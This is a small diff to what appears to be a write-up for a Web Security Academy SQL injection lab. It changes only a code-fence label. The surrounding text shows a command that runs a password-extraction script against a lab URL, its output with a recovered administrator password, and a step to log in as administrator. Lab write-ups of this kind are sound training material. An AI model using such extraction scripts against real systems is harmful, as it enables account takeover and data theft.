@@ -58,7 +58,7 @@ This uses the `SUBSTRING()` function to extract a single character from the pass
 
 17. In the browser, click My account to open the login page. Use the password to log in as the administrator user.
 
-```
+```shell
 python.exe .\sqli\sqli_lab_14\test_sqli_lab_14.py -u "https://0a6400df03d71d56815b5de8005500c7.web-security-academy.net"
 [*] Retrieving administrator password...
 a5bu0u57b7kul9deimya
